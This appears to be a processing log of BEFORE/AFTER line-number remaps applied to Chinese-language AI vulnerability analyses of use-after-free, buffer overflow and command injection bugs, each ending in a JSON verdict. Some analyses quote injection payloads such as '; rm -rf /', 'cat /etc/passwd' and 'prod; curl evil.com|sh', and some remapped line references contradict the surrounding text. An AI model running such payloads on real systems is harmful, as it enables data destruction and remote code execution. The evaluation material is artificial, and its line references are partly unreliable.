## row=36 status=remapped_clean

plan: [{"old": 58, "action": "keep", "style": "cn", "json": false}, {"old": 15, "action": "keep", "style": "cn", "json": false}, {"old": 16, "action": "keep", "style": "cn", "json": false}, {"old": 18, "action": "keep", "style": "cn", "json": false}, {"old": 19, "action": "keep", "style": "cn", "json": false}, {"old": 46, "action": "keep", "style": "cn", "json": false}, {"old": 50, "action": "keep", "style": "cn", "json": false}, {"old": 73, "new": 51, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 main@L51"}, {"old": 48, "action": "keep", "style": "cn", "json": false}, {"old": 48, "action": "keep", "style": "cn", "json": false}, {"old": 50, "action": "keep", "style": "cn", "json": false}, {"old": 73, "new": 45, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 UAF@L45"}, {"old": 48, "action": "keep", "style": "cn", "json": false}, {"old": 30, "action": "keep", "style": "line", "json": true}, {"old": 45, "action": "keep", "style": "line", "json": true}, {"old": 27, "action": "keep", "style": "line", "json": true}, {"old": 40, "action": "keep", "style": "line", "json": true}, {"old": 49, "action": "keep", "style": "line", "json": true}, {"old": 44, "action": "keep", "style": "line", "json": true}, {"old": 30, "action": "keep", "style": "line", "json": true}, {"old": 45, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程**

1. **第58行**：`process_network_data` 调用 `parse_packet`，传入 `bad_data`（长度4）。`parse_packet` 中第15行读取 `pkt_len = 0`，第16行检查 `pkt_len > size-2`（0 > 2 为假），随后第18行 `malloc(0)` 可能返回非NULL指针或NULL（取决于实现），但 `memcpy` 拷贝0字节，`parsed` 置1。
2. **关键路径**：若 `malloc(0)` 返回NULL（部分平台），第19行 `if (!sess->pkt->payload) return;` 提前退出，此时 `parsed` 仍为0。第46行 `if (!sess->parsed)` 为真，调用 `cleanup_session`。
3. **第38-40行**：`cleanup_session` 检查 `payload` 非NULL后执行 `free`，但**未将 `payload` 置为NULL**。此时 `sess->pkt->payload` 成为悬垂指针，`parsed` 仍为0。
4. **第50行**：`process_network_data` 返回-1，但 `main` 第73行仅释放 `sess.pkt`，未再次访问payload。实际触发点在**
```

**AFTER**:
```text
**分析过程**

1. **第58行**：`process_network_data` 调用 `parse_packet`，传入 `bad_data`（长度4）。`parse_packet` 中第15行读取 `pkt_len = 0`，第16行检查 `pkt_len > size-2`（0 > 2 为假），随后第18行 `malloc(0)` 可能返回非NULL指针或NULL（取决于实现），但 `memcpy` 拷贝0字节，`parsed` 置1。
2. **关键路径**：若 `malloc(0)` 返回NULL（部分平台），第19行 `if (!sess->pkt->payload) return;` 提前退出，此时 `parsed` 仍为0。第46行 `if (!sess->parsed)` 为真，调用 `cleanup_session`。
3. **第38-40行**：`cleanup_session` 检查 `payload` 非NULL后执行 `free`，但**未将 `payload` 置为NULL**。此时 `sess->pkt->payload` 成为悬垂指针，`parsed` 仍为0。
4. **第50行**：`process_network_data` 返回-1，但 `main` 第51行仅释放 `sess.pkt`，未再次访问payload。实际触发点在**
```

---

## row=51 status=remapped_clean

plan: [{"old": 63, "new": 48, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 main@L48"}, {"old": 20, "action": "keep", "style": "cn", "json": false}, {"old": 26, "action": "keep", "style": "line", "json": true}, {"old": 37, "action": "keep", "style": "line", "json": true}, {"old": 12, "action": "keep", "style": "line", "json": true}, {"old": 19, "action": "keep", "style": "line", "json": true}, {"old": 26, "action": "keep", "style": "line", "json": true}, {"old": 33, "action": "keep", "style": "line", "json": true}, {"old": 26, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程**

1. **第49-51行**：`cleanup_items()` 函数在循环中先检查 `items[i] != NULL` 再 `free`，随后立即置 `NULL`，这是正确的防御模式。但问题在于该函数只将 `item_count` 置为 0，并未将 `items` 数组整体清空——不过由于每个元素都已置 `NULL`，这本身不是漏洞。

2. **第63行**：`main()` 中第二次调用 `cleanup_items()`。此时 `item_count` 为 0，循环不会执行，因此不会触发二次释放。**关键缺陷**：如果第一次 `cleanup_items()` 后，`item_count` 被外部错误修改为非零值（例如某个函数误将其重置），则第二次调用会访问已释放的指针。

3. **第20行**：`items[i] = NULL` 是正确防御，但**缺少对 `item_count` 与 `MAX_ITEMS` 的边界约束**。若 `item_count` 被越界写入（如通过数组越界），循环会访问 `items[MAX_ITEMS]` 之外的内存，导致越界读（CWE-125 Out-of-bounds Read

4. **第31-34行**：`add_item` 中的 `strncpy` 和末尾置 `\0` 是安全的，但 `items[item_co
```

**AFTER**:
```text
**分析过程**

1. **第49-51行**：`cleanup_items()` 函数在循环中先检查 `items[i] != NULL` 再 `free`，随后立即置 `NULL`，这是正确的防御模式。但问题在于该函数只将 `item_count` 置为 0，并未将 `items` 数组整体清空——不过由于每个元素都已置 `NULL`，这本身不是漏洞。

2. **第48行**：`main()` 中第二次调用 `cleanup_items()`。此时 `item_count` 为 0，循环不会执行，因此不会触发二次释放。**关键缺陷**：如果第一次 `cleanup_items()` 后，`item_count` 被外部错误修改为非零值（例如某个函数误将其重置），则第二次调用会访问已释放的指针。

3. **第20行**：`items[i] = NULL` 是正确防御，但**缺少对 `item_count` 与 `MAX_ITEMS` 的边界约束**。若 `item_count` 被越界写入（如通过数组越界），循环会访问 `items[MAX_ITEMS]` 之外的内存，导致越界读（CWE-125 Out-of-bounds Read

4. **第31-34行**：`add_item` 中的 `strncpy` 和末尾置 `\0` 是安全的，但 `items[item_co
```

---

## row=117 status=remapped_clean

plan: [{"old": 43, "action": "keep", "style": "cn", "json": false}, {"old": 45, "action": "keep", "style": "cn", "json": false}, {"old": 57, "new": 40, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 main@L40"}, {"old": 34, "action": "keep", "style": "line", "json": true}, {"old": 37, "action": "keep", "style": "line", "json": true}, {"old": 34, "action": "keep", "style": "line", "json": true}, {"old": 36, "action": "keep", "style": "line", "json": true}, {"old": 30, "action": "keep", "style": "line", "json": true}, {"old": 37, "action": "keep", "style": "line", "json": true}, {"old": 37, "action": "keep", "style": "line", "json": true}, {"old": 37, "action": "keep", "style": "line", "json": true}, {"old": 37, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程**

1. **第43行（process_user内）**：当 `u->id > 100` 时调用 `delete_user(u)`，该函数在第30-31行释放 `u->name` 和 `u` 指向的内存。此时堆内存已归还。
2. **第45行**：在 `delete_user` 之后立即访问 `u->name`，这是典型的 use-after-free——指针 `u` 未被置空，且指向已释放的堆块。释放后内存内容未定义，读取可能导致崩溃或信息泄露。
3. **第57行（main）**：`process_user(admin)` 传入 id=200，必然触发上述分支。且 `process_user` 返回后 `main` 未再使用 `admin`，但 `process_user` 内部的访问已构成漏洞。
4. **防御缺失**：`delete_user` 未将指针置 NULL（如 `u = NULL;`），调用方也无法得知指针已失效；`process_user` 在 free 后未检查或重新赋值。正确做法是调用 `delete_user` 后立即 `u = NULL;` 或重新分配内存。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-416 Use After Free", "risk_l
```

**AFTER**:
```text
**分析过程**

1. **第43行（process_user内）**：当 `u->id > 100` 时调用 `delete_user(u)`，该函数在第30-31行释放 `u->name` 和 `u` 指向的内存。此时堆内存已归还。
2. **第45行**：在 `delete_user` 之后立即访问 `u->name`，这是典型的 use-after-free——指针 `u` 未被置空，且指向已释放的堆块。释放后内存内容未定义，读取可能导致崩溃或信息泄露。
3. **第40行（main）**：`process_user(admin)` 传入 id=200，必然触发上述分支。且 `process_user` 返回后 `main` 未再使用 `admin`，但 `process_user` 内部的访问已构成漏洞。
4. **防御缺失**：`delete_user` 未将指针置 NULL（如 `u = NULL;`），调用方也无法得知指针已失效；`process_user` 在 free 后未检查或重新赋值。正确做法是调用 `delete_user` 后立即 `u = NULL;` 或重新分配内存。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-416 Use After Free", "risk_l
```

---

## row=228 status=remapped_clean

plan: [{"old": 10, "action": "keep", "style": "cn", "json": false}, {"old": 12, "action": "keep", "style": "cn", "json": false}, {"old": 47, "action": "keep", "style": "cn", "json": false}, {"old": 52, "new": 16, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 memcpy@L16"}, {"old": 13, "action": "keep", "style": "line", "json": true}, {"old": 16, "action": "keep", "style": "line", "json": true}, {"old": 23, "action": "keep", "style": "line", "json": true}, {"old": 13, "action": "keep", "style": "line", "json": true}, {"old": 16, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程**：

1. 第28-36行：`worker` 函数内循环调用 `process_chunk`，该函数在第9-12行检查剩余空间后执行 `memcpy`。但此处存在**TOCTOU（Time-of-Check Time-of-Use）竞态**：两个线程可能同时通过第10行的空间检查，然后交错执行第12行的 `memcpy`。
2. 第44-45行：两个线程共享 `shared_buf`，且没有任何互斥锁保护。当线程1和线程2同时检查到 `buf->len` 小于 `size` 时，它们都会执行 `memcpy`，导致写入位置重叠。
3. 具体漏洞：假设初始 `buf->len=0`，两个线程同时检查 `input_len <= 64` 通过，然后线程1写入位置0-5，线程2写入位置0-5，导致**堆缓冲区越界写**（CWE-122 Heap-based Buffer Overflow
4. 第47行：`memcpy` 写入后，`buf->len` 被两个线程分别更新，但最终值可能小于实际写入量，导致缓冲区溢出未被检测，最终第52行的输出可能读取越界数据。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-122 Heap-based Buffer Overflow", "risk_level"
```

**AFTER**:
```text
**分析过程**：

1. 第28-36行：`worker` 函数内循环调用 `process_chunk`，该函数在第9-12行检查剩余空间后执行 `memcpy`。但此处存在**TOCTOU（Time-of-Check Time-of-Use）竞态**：两个线程可能同时通过第10行的空间检查，然后交错执行第12行的 `memcpy`。
2. 第44-45行：两个线程共享 `shared_buf`，且没有任何互斥锁保护。当线程1和线程2同时检查到 `buf->len` 小于 `size` 时，它们都会执行 `memcpy`，导致写入位置重叠。
3. 具体漏洞：假设初始 `buf->len=0`，两个线程同时检查 `input_len <= 64` 通过，然后线程1写入位置0-5，线程2写入位置0-5，导致**堆缓冲区越界写**（CWE-122 Heap-based Buffer Overflow
4. 第47行：`memcpy` 写入后，`buf->len` 被两个线程分别更新，但最终值可能小于实际写入量，导致缓冲区溢出未被检测，最终第16行的输出可能读取越界数据。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-122 Heap-based Buffer Overflow", "risk_level"
```

---

## row=234 status=partial

plan: [{"old": 61, "action": "keep", "style": "L", "json": false}, {"old": 35, "action": "keep", "style": "L", "json": false}, {"old": 26, "action": "keep", "style": "L", "json": false}, {"old": 81, "action": "keep", "style": "L", "json": false}, {"old": 41, "action": "keep", "style": "L", "json": false}, {"old": 45, "action": "keep", "style": "L", "json": false}, {"old": 46, "action": "keep", "style": "L", "json": false}, {"old": 49, "action": "keep", "style": "L", "json": false}, {"old": 50, "action": "keep", "style": "L", "json": false}, {"old": 55, "action": "keep", "style": "L", "json": false}, {"old": 70, "action": "keep", "style": "L", "json": false}, {"old": 56, "action": "keep", "style": "L", "json": false}, {"old": 56, "action": "keep", "style": "L", "json": false}, {"old": 44, "action": "keep", "style": "line", "json": false}, {"old": 49, "action": "keep", "style": "L", "json": false}, {"old": 44, "action": "keep", "style": "line", "json": false}, {"old": 56, "action": "keep", "style": "L", "json": false}, {"old": 29, "action": "keep", "style": "L", "json": false}, {"old": 30, "action": "keep", "style": "L", "json": false}, {"old": 85, "action": "keep", "style": "L", "json": false}, {"old": 19, "action": "keep", "style": "L", "json": false}, {"old": 81, "action": "keep", "style": "L", "json": false}, {"old": 3, "action": "keep", "style": "L", "json": false}, {"old": 58, "action": "keep", "style": "L", "json": false}, {"old": 35, "action": "keep", "style": "line", "json": true}, {"old": 56, "action": "keep", "style": "line", "json": true}, {"old": 55, "action": "keep", "style": "L", "json": true}, {"old": 70, "action": "keep", "style": "L", "json": true}, {"old": 41, "action": "keep", "style": "L", "json": true}, {"old": 45, "action": "keep", "style": "L", "json": true}, {"old": 49, "action": "keep", "style": "L", "json": true}, {"old": 55, "action": "keep", "style": "L", "json": true}, {"old": 56, "action": "keep", "style": "L", "json": true}, {"old": 70, "action": "keep", "style": "L", "json": true}, {"old": 55, "action": "keep", "style": "L", "json": true}, {"old": 49, "action": "keep", "style": "L", "json": true}, {"old": 19, "action": "keep", "style": "line", "json": true}, {"old": 3, "action": "keep", "style": "line", "json": true}, {"old": 61, "action": "restyle", "style": "L", "to": "line"}, {"old": 35, "action": "restyle", "style": "L", "to": "line"}, {"old": 26, "action": "restyle", "style": "L", "to": "line"}, {"old": 81, "action": "restyle", "style": "L", "to": "line"}, {"old": 41, "action": "restyle", "style": "L", "to": "line"}, {"old": 45, "action": "restyle", "style": "L", "to": "line"}, {"old": 46, "action": "restyle", "style": "L", "to": "line"}, {"old": 49, "action": "restyle", "style": "L", "to": "line"}, {"old": 50, "action": "restyle", "style": "L", "to": "line"}, {"old": 55, "action": "restyle", "style": "L", "to": "line"}, {"old": 70, "action": "restyle", "style": "L", "to": "line"}, {"old": 56, "action": "restyle", "style": "L", "to": "line"}, {"old": 56, "action": "restyle", "style": "L", "to": "line"}, {"old": 49, "action": "restyle", "style": "L", "to": "line"}, {"old": 56, "action": "restyle", "style": "L", "to": "line"}, {"old": 29, "action": "restyle", "style": "L", "to": "line"}, {"old": 30, "action": "restyle", "style": "L", "to": "line"}, {"old": 85, "action": "restyle", "style": "L", "to": "line"}, {"old": 19, "action": "restyle", "style": "L", "to": "line"}, {"old": 81, "action": "restyle", "style": "L", "to": "line"}, {"old": 3, "action": "restyle", "style": "L", "to": "line"}, {"old": 58, "action": "restyle", "style": "L", "to": "line"}]

**BEFORE**:
```text
全入口枚举：内核字符设备接口：L61-66 `static const struct file_operations fops = {...}` 注册 drv_read/drv_write，用户态经 write/read 系统调用到达 L35 `drv_write(struct file *filp, const char __user *user_buf, size_t count, loff_t *off)`（user_buf/count 均可控）与 L26 drv_read；无其他入口（L81 实际注册省略）。
防御链逐段核验（safe 结论逐段验证）：① L41 `if (count > BUF_SIZE * 4) return -EINVAL;` 输入界 128（BUF_SIZE*4 为编译期常量、无回绕）——有效；② L45 `temp = kmalloc(count, GFP_KERNEL)` 与 L46-47 空指针检查——临时缓冲与 count 严格等长、无溢出面（count=0 时 kmalloc(0) 返回 ZERO_SIZE_PTR 非空，后续 0 长度操作安全）——有效；③ L49 `if (COPY_FROM_USER(temp, user_buf, count))` 失败即 L50-51 kfree+EFAULT——成功路径上 temp 前 count
```

**AFTER**:
```text
全入口枚举：内核字符设备接口：line 61-66 `static const struct file_operations fops = {...}` 注册 drv_read/drv_write，用户态经 write/read 系统调用到达 line 35 `drv_write(struct file *filp, const char __user *user_buf, size_t count, loff_t *off)`（user_buf/count 均可控）与 line 26 drv_read；无其他入口（line 81 实际注册省略）。
防御链逐段核验（safe 结论逐段验证）：① line 41 `if (count > BUF_SIZE * 4) return -EINVAL;` 输入界 128（BUF_SIZE*4 为编译期常量、无回绕）——有效；② line 45 `temp = kmalloc(count, GFP_KERNEL)` 与 line 46-47 空指针检查——临时缓冲与 count 严格等长、无溢出面（count=0 时 kmalloc(0) 返回 ZERO_SIZE_PTR 非空，后续 0 长度操作安全）——有效；③ line 49 `if (COPY_FROM_USER(temp, user_buf, count))` 失败即 line 50
```

---

## row=238 status=remapped_clean

plan: [{"old": 29, "action": "keep", "style": "cn", "json": false}, {"old": 37, "action": "keep", "style": "cn", "json": false}, {"old": 29, "action": "keep", "style": "cn", "json": false}, {"old": 40, "new": 38, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 logger@L38"}, {"old": 27, "action": "keep", "style": "line", "json": true}, {"old": 34, "action": "keep", "style": "line", "json": true}, {"old": 9, "action": "keep", "style": "line", "json": true}, {"old": 27, "action": "keep", "style": "line", "json": true}, {"old": 33, "action": "keep", "style": "line", "json": true}, {"old": 27, "action": "keep", "style": "line", "json": true}, {"old": 34, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
---

**分析过程：**

1. **第18-23行**：`EXTRA_FILTER` 从环境变量 `EXTRA_CLEANUP_FILTER` 读取，该变量可能由 CI/CD 外部系统或用户配置注入，属于不可信输入源。
2. **第29行**：`FILTERS+=($(eval echo "$EXTRA_FILTER"))` 使用 `eval echo` 对用户输入进行求值。若 `EXTRA_FILTER` 包含 `; rm -rf /` 或 `$(malicious_command)`，`eval` 会执行任意 shell 命令，实现命令注入。
3. **第37行**：`eval "find $LOG_DIR ${FILTERS[@]} -delete"` 再次使用 `eval` 执行整个 find 命令。即使第29行被修复，此处若 `FILTERS` 数组被注入恶意元素（如 `-exec` 参数），仍会执行任意命令。
4. **第40行**：`logger` 记录 `EXTRA_FILTER` 内容，若包含特殊字符可能造成日志注入，但主要漏洞点为上述两处 `eval`。

**结论：** 攻击者可控制 `EXTRA_CLEANUP_FILTER` 环境变量，利用双重 `eval` 执行任意系统命令，完全接管运行该脚本的主机。
```json
{"has_vulnerabi
```

**AFTER**:
```text
---

**分析过程：**

1. **第18-23行**：`EXTRA_FILTER` 从环境变量 `EXTRA_CLEANUP_FILTER` 读取，该变量可能由 CI/CD 外部系统或用户配置注入，属于不可信输入源。
2. **第29行**：`FILTERS+=($(eval echo "$EXTRA_FILTER"))` 使用 `eval echo` 对用户输入进行求值。若 `EXTRA_FILTER` 包含 `; rm -rf /` 或 `$(malicious_command)`，`eval` 会执行任意 shell 命令，实现命令注入。
3. **第37行**：`eval "find $LOG_DIR ${FILTERS[@]} -delete"` 再次使用 `eval` 执行整个 find 命令。即使第29行被修复，此处若 `FILTERS` 数组被注入恶意元素（如 `-exec` 参数），仍会执行任意命令。
4. **第38行**：`logger` 记录 `EXTRA_FILTER` 内容，若包含特殊字符可能造成日志注入，但主要漏洞点为上述两处 `eval`。

**结论：** 攻击者可控制 `EXTRA_CLEANUP_FILTER` 环境变量，利用双重 `eval` 执行任意系统命令，完全接管运行该脚本的主机。
```json
{"has_vulnerabi
```

---

## row=244 status=remapped_clean

plan: [{"old": 28, "action": "keep", "style": "cn", "json": false}, {"old": 39, "new": 17, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 fmt.Sprintf@L17"}, {"old": 31, "action": "keep", "style": "cn", "json": false}, {"old": 17, "action": "keep", "style": "line", "json": true}, {"old": 21, "action": "keep", "style": "line", "json": true}, {"old": 18, "action": "keep", "style": "line", "json": true}, {"old": 20, "action": "keep", "style": "line", "json": true}, {"old": 17, "action": "keep", "style": "line", "json": true}, {"old": 21, "action": "keep", "style": "line", "json": true}, {"old": 21, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程：**

1. **第 28 行**：`cmdStr` 使用 `fmt.Sprintf` 将 `instanceName` 直接拼接到 shell 命令字符串中，且 `instanceName` 来自外部 API（第 39 行调用处可见其可为任意用户输入），此时攻击者注入的分号、管道符等会被 shell 解释为命令分隔符。
2. **第 31 行**：`exec.Command("sh", "-c", cmdStr)` 明确启用 shell 模式（等价于 Python 的 `shell=True`），`-c` 参数使 `sh` 完整解析拼接后的字符串。注入的 `; echo 'pwned' > /tmp/flag; #` 会被执行，且 `#` 注释掉后续合法命令。
3. **第 33-34 行**：`CombinedOutput()` 返回命令输出，但攻击者在注入命令中已写入文件，此输出仅用于日志记录，不影响攻击效果。整条链路无任何输入校验或转义（如 `shlex.quote` 或白名单），漏洞成立。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "High", "source": "line 17: fmt.S
```

**AFTER**:
```text
**分析过程：**

1. **第 28 行**：`cmdStr` 使用 `fmt.Sprintf` 将 `instanceName` 直接拼接到 shell 命令字符串中，且 `instanceName` 来自外部 API（第 17 行调用处可见其可为任意用户输入），此时攻击者注入的分号、管道符等会被 shell 解释为命令分隔符。
2. **第 31 行**：`exec.Command("sh", "-c", cmdStr)` 明确启用 shell 模式（等价于 Python 的 `shell=True`），`-c` 参数使 `sh` 完整解析拼接后的字符串。注入的 `; echo 'pwned' > /tmp/flag; #` 会被执行，且 `#` 注释掉后续合法命令。
3. **第 33-34 行**：`CombinedOutput()` 返回命令输出，但攻击者在注入命令中已写入文件，此输出仅用于日志记录，不影响攻击效果。整条链路无任何输入校验或转义（如 `shlex.quote` 或白名单），漏洞成立。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "High", "source": "line 17: fmt.S
```

---

## row=256 status=remapped_clean

plan: [{"old": 25, "action": "keep", "style": "cn", "json": false}, {"old": 38, "new": 12, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 curl@L12"}, {"old": 29, "action": "keep", "style": "cn", "json": false}, {"old": 27, "action": "keep", "style": "cn", "json": false}, {"old": 12, "action": "keep", "style": "line", "json": true}, {"old": 17, "action": "keep", "style": "line", "json": true}, {"old": 29, "action": "keep", "style": "line", "json": true}, {"old": 14, "action": "keep", "style": "line", "json": true}, {"old": 17, "action": "keep", "style": "line", "json": true}, {"old": 12, "action": "keep", "style": "line", "json": true}, {"old": 17, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
分析过程：
1. 第25行：`cmd = "curl ... /health/" + service_name` 中 `service_name` 直接来自第38行 `sys.argv[1]`，未经过滤或转义，成为注入源。
2. 第29行：`subprocess.run(cmd, shell=True, ...)` 使用 `shell=True` 执行拼接后的字符串，若 `service_name` 包含 `;`、`&&`、`|` 等shell元字符，将执行任意命令。
3. 第27行：`print(f"执行命令: {cmd}")` 会将注入内容回显，便于攻击者确认注入点，但非漏洞本身。
4. 无任何白名单校验（如正则匹配 `^[a-zA-Z0-9_-]+$`）或使用 `shlex.quote()` 转义，第25-29行形成完整的注入链。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "High", "source": "line 12: cmd = \"curl -s -o /dev/null -w '%{http_code}' http://\" + host + \"/health/\" + service_name 直
```

**AFTER**:
```text
分析过程：
1. 第25行：`cmd = "curl ... /health/" + service_name` 中 `service_name` 直接来自第12行 `sys.argv[1]`，未经过滤或转义，成为注入源。
2. 第29行：`subprocess.run(cmd, shell=True, ...)` 使用 `shell=True` 执行拼接后的字符串，若 `service_name` 包含 `;`、`&&`、`|` 等shell元字符，将执行任意命令。
3. 第27行：`print(f"执行命令: {cmd}")` 会将注入内容回显，便于攻击者确认注入点，但非漏洞本身。
4. 无任何白名单校验（如正则匹配 `^[a-zA-Z0-9_-]+$`）或使用 `shlex.quote()` 转义，第25-29行形成完整的注入链。
```json
{"has_vulnerability": true, "vulnerability_type": "CWE-78 OS Command Injection", "risk_level": "High", "source": "line 12: cmd = \"curl -s -o /dev/null -w '%{http_code}' http://\" + host + \"/health/\" + service_name 直
```

---

## row=266 status=partial

plan: [{"old": 48, "action": "keep", "style": "cn", "json": false}, {"old": 76, "new": 23, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 shell@L23"}, {"old": 50, "action": "keep", "style": "cn", "json": false}, {"old": 70, "action": "human", "style": "cn", "json": false, "why": "唯一命中 23 但已被同组引用占用"}, {"old": 26, "action": "keep", "style": "cn", "json": false}, {"old": 19, "action": "keep", "style": "line", "json": true}, {"old": 23, "action": "keep", "style": "line", "json": true}, {"old": 21, "action": "keep", "style": "line", "json": true}, {"old": 23, "action": "keep", "style": "line", "json": true}, {"old": 22, "action": "keep", "style": "line", "json": true}, {"old": 23, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程：**

1. **第48行**：`const cmd = \`docker pull ${imageTag} && ...\`` 将 `imageTag`（由 `serviceName` 和 `version` 拼接）直接嵌入到字符串命令中。`version` 来自第76行 `args[1]`，是用户可控输入。
2. **第50行**：`execSync(cmd, { shell: true, ... })` 使用 `shell: true` 执行拼接命令。攻击者可通过 `version` 注入 shell 元字符，例如 `1.0; cat /etc/passwd`，导致任意命令执行。
3. **第28-32行**：`deployWithSpawn` 使用 `spawn` 的数组参数形式（`['docker', 'pull', imageTag]`），参数被安全传递，不经过 shell 解释，有效阻断注入。但第70行 `config.useSafeMode` 若为 false（默认未设置），则走危险路径。
4. **第26行**：`serviceName` 有白名单校验（第29-31行），但 `version` 无任何过滤或转义，是主要注入点。该漏洞对应 CWE-78 OS Command Injection
```json
{"has_vulnerability":
```

**AFTER**:
```text
**分析过程：**

1. **第48行**：`const cmd = \`docker pull ${imageTag} && ...\`` 将 `imageTag`（由 `serviceName` 和 `version` 拼接）直接嵌入到字符串命令中。`version` 来自第23行 `args[1]`，是用户可控输入。
2. **第50行**：`execSync(cmd, { shell: true, ... })` 使用 `shell: true` 执行拼接命令。攻击者可通过 `version` 注入 shell 元字符，例如 `1.0; cat /etc/passwd`，导致任意命令执行。
3. **第28-32行**：`deployWithSpawn` 使用 `spawn` 的数组参数形式（`['docker', 'pull', imageTag]`），参数被安全传递，不经过 shell 解释，有效阻断注入。但第70行 `config.useSafeMode` 若为 false（默认未设置），则走危险路径。
4. **第26行**：`serviceName` 有白名单校验（第29-31行），但 `version` 无任何过滤或转义，是主要注入点。该漏洞对应 CWE-78 OS Command Injection
```json
{"has_vulnerability":
```

---

## row=276 status=remapped_clean

plan: [{"old": 43, "action": "keep", "style": "cn", "json": false}, {"old": 16, "action": "keep", "style": "cn", "json": false}, {"old": 52, "new": 31, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 env.apiKey@L31"}, {"old": 30, "action": "keep", "style": "cn", "json": false}, {"old": 11, "action": "keep", "style": "cn", "json": false}, {"old": 20, "action": "keep", "style": "cn", "json": false}, {"old": 16, "action": "keep", "style": "cn", "json": false}, {"old": 31, "action": "keep", "style": "line", "json": true}, {"old": 31, "action": "keep", "style": "line", "json": true}, {"old": 39, "action": "keep", "style": "line", "json": true}, {"old": 21, "action": "keep", "style": "line", "json": true}, {"old": 25, "action": "keep", "style": "line", "json": true}, {"old": 26, "action": "keep", "style": "line", "json": true}, {"old": 31, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程**

1. **第43行**：`exec(cmd, ...)` 使用 `child_process.exec` 执行命令，该函数通过 shell 解释命令字符串。若 `cmd` 中包含用户可控内容，则可注入任意 shell 命令。

2. **第29-30行**：`projectName` 虽经第16行白名单校验，但 `targetEnv` 直接来自第52行 `args[1]`，未做任何校验。`env.apiKey` 从配置文件读取，攻击者无法直接控制，但 `targetEnv` 被拼接进 `cmd`。

3. **第30行**：`cmd` 字符串中 `${targetEnv}` 和 `${env.apiKey}` 直接拼接。攻击者可通过传入 `targetEnv` 为 `prod; curl evil.com|sh` 来注入命令。由于 `exec` 使用 shell 执行，分号和管道符会被解释，导致任意命令执行。

4. **第11行**：`loadConfig` 和后续逻辑没有对环境名做白名单或格式校验，仅检查是否存在（第20行），攻击者可利用此缺陷注入恶意命令。

5. 尽管第16行对项目名做了白名单，但 `targetEnv` 是独立的注入点，且 `exec` 的 shell 特性放大了风险，构成完整的命令注入漏洞。
```json
{"has_vulnera
```

**AFTER**:
```text
**分析过程**

1. **第43行**：`exec(cmd, ...)` 使用 `child_process.exec` 执行命令，该函数通过 shell 解释命令字符串。若 `cmd` 中包含用户可控内容，则可注入任意 shell 命令。

2. **第29-30行**：`projectName` 虽经第16行白名单校验，但 `targetEnv` 直接来自第31行 `args[1]`，未做任何校验。`env.apiKey` 从配置文件读取，攻击者无法直接控制，但 `targetEnv` 被拼接进 `cmd`。

3. **第30行**：`cmd` 字符串中 `${targetEnv}` 和 `${env.apiKey}` 直接拼接。攻击者可通过传入 `targetEnv` 为 `prod; curl evil.com|sh` 来注入命令。由于 `exec` 使用 shell 执行，分号和管道符会被解释，导致任意命令执行。

4. **第11行**：`loadConfig` 和后续逻辑没有对环境名做白名单或格式校验，仅检查是否存在（第20行），攻击者可利用此缺陷注入恶意命令。

5. 尽管第16行对项目名做了白名单，但 `targetEnv` 是独立的注入点，且 `exec` 的 shell 特性放大了风险，构成完整的命令注入漏洞。
```json
{"has_vulnera
```

---

## row=284 status=remapped_clean

plan: [{"old": 34, "action": "keep", "style": "cn", "json": false}, {"old": 42, "action": "keep", "style": "cn", "json": false}, {"old": 35, "action": "keep", "style": "cn", "json": false}, {"old": 39, "action": "keep", "style": "cn", "json": false}, {"old": 61, "new": 44, "action": "remap", "style": "cn", "json": false, "strength": "hi", "basis": "唯一命中 SAFE_DEPLOY@L44"}, {"old": 17, "action": "keep", "style": "line", "json": true}, {"old": 20, "action": "keep", "style": "line", "json": true}, {"old": 20, "action": "keep", "style": "line", "json": true}, {"old": 19, "action": "keep", "style": "line", "json": true}, {"old": 20, "action": "keep", "style": "line", "json": true}, {"old": 50, "action": "keep", "style": "line", "json": true}]

**BEFORE**:
```text
**分析过程**

1. **第34行** `const cmd = \`git checkout ${branch} && rsync -avz --delete ./ /srv/${target}/\`;` 将 `branch` 和 `target` 直接拼接进 shell 命令字符串。`branch` 来自 `process.argv[3]`（第42行），攻击者可传入 `main; cat /etc/passwd` 等恶意值。
2. **第35行** `execSync(cmd, { shell: true })` 以 shell 模式执行拼接后的命令，构成命令注入的 sink。`target` 虽在第39行有白名单校验，但 `branch` 完全没有校验，攻击面独立存在。
3. **第46-47行** 安全对照路径 `deploySafe` 使用 `execFileSync` 传参数数组（第49-52行），不经过 shell，`branch` 中的特殊字符会被当作字面参数，有效阻断注入。
4. **第56-60行** 主流程中 `useSafe` 默认未设置时走第61行 `deployLegacy` 漏洞路径；即使启用 `SAFE_DEPLOY=1`，分支变量仍可能被复用，但安全函数已消除注入风险。
5. **结论** 存在 CWE-749 Exposed Dangerou
```

**AFTER**:
```text
**分析过程**

